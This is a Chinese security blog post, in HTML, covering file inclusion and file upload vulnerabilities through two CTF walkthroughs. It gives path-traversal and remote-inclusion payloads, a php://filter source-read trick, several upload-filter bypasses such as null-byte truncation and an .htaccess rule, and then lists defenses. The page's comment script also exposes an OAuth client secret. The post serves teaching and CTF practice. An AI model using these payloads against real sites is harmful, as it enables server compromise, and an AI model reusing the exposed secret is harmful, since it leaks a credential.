@@ -1,0 +1,164 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="文件包含&amp;&amp;文件上传"><meta name="keywords" content="文件包含 文件上传"><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>文件包含&amp;&amp;文件上传 | J0k3r</title><link rel="shortcut icon" href="/img/fav.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://unpkg.com"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitment/style/default.min.css"><script src="https://cdn.jsdelivr.net/npm/gitment/dist/gitment.browser.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  }
+} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-文件包含"><span class="toc-number">1.</span> <span class="toc-text">0x01 文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析"><span class="toc-number">2.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-文件上传"><span class="toc-number">3.</span> <span class="toc-text">0x02 文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一个南邮的CTF题—上传绕过"><span class="toc-number">4.</span> <span class="toc-text">一个南邮的CTF题—上传绕过</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">28</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">20</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="https://bossgirl.github.io/">八千国家奖学金</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://dxxblog.top/">xx_C1</a><a class="author-info-links__name text-center" href="http://www.cooper111.xyz/">花郎世纪</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://raw.githubusercontent.com/zhuxianjin/images/master/topimg.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/about/">关于</a></span></div><div id="post-info"><div id="post-title">文件包含&amp;&amp;文件上传</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-01-30</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>&#8203;&#8203;&#8203;</p>
+<a id="more"></a>
+<h3 id="0x01-文件包含"><a href="#0x01-文件包含" class="headerlink" title="0x01 文件包含"></a>0x01 文件包含</h3><ul>
+<li>本地文件包含(Loacl File Inclusion,LFI)</li>
+</ul>
+<blockquote>
+<p>通过浏览器引进(包含)web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格 的过滤允许遍历目录的字符注入浏览器并执行 </p>
+</blockquote>
+<ul>
+<li>远程文件包含(Remote File Inclusion,RFI)</li>
+</ul>
+<blockquote>
+<p>该漏洞允许攻击者包含一个远程的文件,一般是在远程服务器上预先设置好的脚本。 此漏洞是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露、拒绝服务攻击 甚至在目标服务器上执行代码</p>
+</blockquote>
+<ul>
+<li>条件： <ul>
+<li>php.ini中配置项：</li>
+<li>allow_ url_fopen     ON</li>
+<li>allow_ url_include   ON  </li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>本地包含：</p>
+<ul>
+<li>?file=flag.txt </li>
+<li>?file=../../../../../../../../../var/lib/locate.db </li>
+<li>?file=../../../../../../../../../usr/local/apache2/conf/httpd</li>
+</ul>
+</li>
+<li><p>远程文件包含：</p>
+<ul>
+<li>?file=[http|https|ftp]://example.com/shell.txt  </li>
+<li>(需要allow_url_fopen=On并且 allow_url_include=On)   </li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>PHP中常见的文件包含函数</p>
+<ul>
+<li>include()：当使用该函数包含文件时，<strong><em>只有代码执行到include()函数是才将文件包含进来</em></strong>，发生错误时只给出一个警告，继续向下执行<ul>
+<li>include_once()：功能和include()相同，区别在于当重复调用同意文件时，程序只调用一次</li>
+<li>requier()： 使用require函数包含文件时，<strong><em>只要程序一执行，立即调用脚本；</em></strong>如果前者执行发生错误，函数或输出错误信息，并终止脚本运行</li>
+<li>require_once()：功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>jsp/Servlet</p>
+<ul>
+<li>ava.io.file() , java.io.filereader() ….</li>
+</ul>
+</li>
+<li><p>asp</p>
+<ul>
+<li>include file , include virtual   </li>
+</ul>
+</li>
+<li><p>漏洞利用及危害</p>
+<ul>
+<li>上传图片，包含图片Getshell</li>
+<li>读文件，读PHP文件</li>
+<li>包含日志文件GetShell</li>
+<li>包含/proc/self/environ文件GetShell</li>
+<li>如果有phpinfo可以包含临时文件</li>
+<li>包含data:// 或者 php://input 等协议（需要allow_url_include=on） </li>
+<li>执行任意脚本代码</li>
+<li>控制网站</li>
+<li>控制服务器</li>
+</ul>
+</li>
+<li><p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。</p>
+</li>
+</ul>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><img src="https://i.loli.net/2018/07/29/5b5dd090be2d7.jpg" alt="6.jpg"></p>
+<p>click之后是一个test，url变为</p>
+<p><code>http://4.chinalover.sinaapp.com/web7/index.php?file=show.php</code></p>
+<p>这里可以通过PHP内置协议直接读取index的代码</p>
+<p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p>页面是index.php的base64加密后的代码,解密即可</p>
+<p><img src="https://i.loli.net/2018/07/29/5b5dd090d2bd3.jpg" alt="5.jpg"></p>
+<h3 id="0x02-文件上传"><a href="#0x02-文件上传" class="headerlink" title="0x02 文件上传"></a>0x02 文件上传</h3><blockquote>
+<p>文件上传漏洞就是利用可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码</p>
+</blockquote>
+<ul>
+<li><p>原因</p>
+<ul>
+<li><p>对于上传文件的后缀名（扩展名）没有做较为严格的限制</p>
+</li>
+<li><p>对于上传文件的MIMETYPE 没有做检查</p>
+</li>
+<li><p>权限上没有对于上传的文件的文件权限，（尤其是对于shebang类型的文件）</p>
+</li>
+<li><p>对于web server对于上传文件或者指定目录的行为没有做限制</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>注：</strong></p>
+<blockquote>
+<ol>
+<li>MIMETYPE即媒体类型，通过Content-Type来表示。</li>
+<li>代替magic number做文本文件的metadata的，一是扩展名，一是shebang</li>
+<li>magic number：很多类型的文件，其起始的几个字节的内容是固定的（或是有意填充，或是本就如此）。因此这几个字节的内容也被称为魔数 (magic number)，因为根据这几个字节的内容就可以确定文件类型。</li>
+<li>metadata即元数据：描述数据的数据，对数据及信息资源的描述性信息。</li>
+</ol>
+</blockquote>
+<p>感觉较好的博文：</p>
+<p><a href="https://www.cnblogs.com/shellr00t/p/6426945.html" target="_blank" rel="noopener">典型漏洞归纳之上传漏洞 - sm0nk - 博客园</a></p>
+<p><a href="http://blog.51cto.com/wt7315/1865580" target="_blank" rel="noopener">文件上传漏洞及解析漏洞总结-罹殇-51CTO博客</a></p>
+<p><strong><em><u>以下七点内容源自</u></em></strong><a href="https://www.cnblogs.com/xishaonian/p/6417729.html" target="_blank" rel="noopener">文件上传漏洞的一些总结 - 珍惜少年时 - 博客园</a></p>
+<ol>
+<li><p>MIME类型绕过:<br>上传木马时，提示格式错误。直接抓包修改Content-Type 为正确的格式尝试绕过</p>
+</li>
+<li><p>文件扩展名绕过：<br>Php除了可以解析php后缀 还可以解析php2.php3，php4 后缀</p>
+</li>
+<li><p>文件内容检测绕过：<br>抓包，在正常图片末尾添加一句话木马</p>
+</li>
+<li><p>00截断绕过上传<br>1.php .jpg   空格二进制20改为00<br>IIS 6.0 目录路径检测解析绕过<br>上传路径改为<br>XXX/1.asp/</p>
+</li>
+<li><p>IIS6.0 解析缺陷漏洞绕过<br>上传路径出修改<br>XXX/1.php;<br>Apache 解析缺陷绕过上传漏洞<br>修改后缀名<br>122.php.7zz（7zz不能识别的后缀名）</p>
+</li>
+<li><p>htaccess解析漏洞：<br>上传的jpg文件都会以php格式解析<br>.htaccess内容：<br>AddType    application/x-httpd-php    .jpg</p>
+</li>
+<li><p>fck编辑器版本识别及信息收集<br>版本地址（2.2.4/2.2.6）<br><code>_samples/default.html</code><br><code>_whatsnew.html</code><br>Fck2.2.4 上传地址：<br><code>editor/filemanager/browser/default/comectors/test.htm</code><br><code>editor/filemanager/upload/test.html</code><br>V2.2.6<br><code>editor/filemanager/connectors/test.html</code><br><code>............................................../uploadtest.html</code></p>
+</li>
+</ol>
+<p>fck编辑器解析漏洞<br>/1.asp/下创建文件夹2.asp （2.asp会被转成2_asp）</p>
+<h3 id="一个南邮的CTF题—上传绕过"><a href="#一个南邮的CTF题—上传绕过" class="headerlink" title="一个南邮的CTF题—上传绕过"></a>一个南邮的CTF题—上传绕过</h3><p><img src="https://i.loli.net/2018/07/29/5b5dd0b1183db.jpg" alt="8.jpg"></p>
+<p>上传图片并抓包，尝试各种拓展名修改，00截断等，无果，试了下uploads，修改下dir  ，随便改为/uploads/002.php</p>
+<p>reponse中filename为除拓展名的部分，basename即为最终文件名，最终为022.php011.png，和filename部分拼到一起了</p>
+<p><img src="https://i.loli.net/2018/07/29/5b5dd0b1654e9.jpg" alt="10.jpg"></p>
+<p>测试了下在filename前加一个00截断，然而行不通，那就可以在022.php后加一个00截断</p>
+<p><img src="https://i.loli.net/2018/07/29/5b5dd0b153f28.jpg" alt="9.jpg"></p>
+<p>防范：</p>
+<ul>
+<li>文件扩展名服务端白名单校验。</li>
+<li>文件内容服务端校验。</li>
+<li>上传文件重命名。</li>
+<li>隐藏上传文件路径</li>
+</ul>
+<p><strong><em>白名单是最有保障的安全措施</em></strong>    </p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">J0k3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yoursite.com/2018/01/30/file-upload/">http://yoursite.com/2018/01/30/file-upload/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yoursite.com">J0k3r</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/文件包含-文件上传/">文件包含 文件上传</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/alipay.jpg"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/wechat.jpg"><div class="post-qr-code__desc">微信打赏</div></div></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/02/10/nmap_mind/"><i class="fa fa-chevron-left">  </i><span>Nmap_思维导图（转）</span></a></div></nav><div id="gitment-container"></div><script>var gitment = new Gitment({
+  id: md5(decodeURI(location.pathname)),
+  owner: 'zhuxianjin',
+  repo: 'zhuxianjin.github.io',
+  oauth: {
+    client_id: '10dcae32e6ed34a16cc',
+    client_secret: '7d1ef2b81d50d3f2f24e87ca3251840506c944d2'
+  }
+})
+gitment.render('gitment-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://raw.githubusercontent.com/zhuxianjin/images/master/topimg.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2019 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+}</script></body></html>
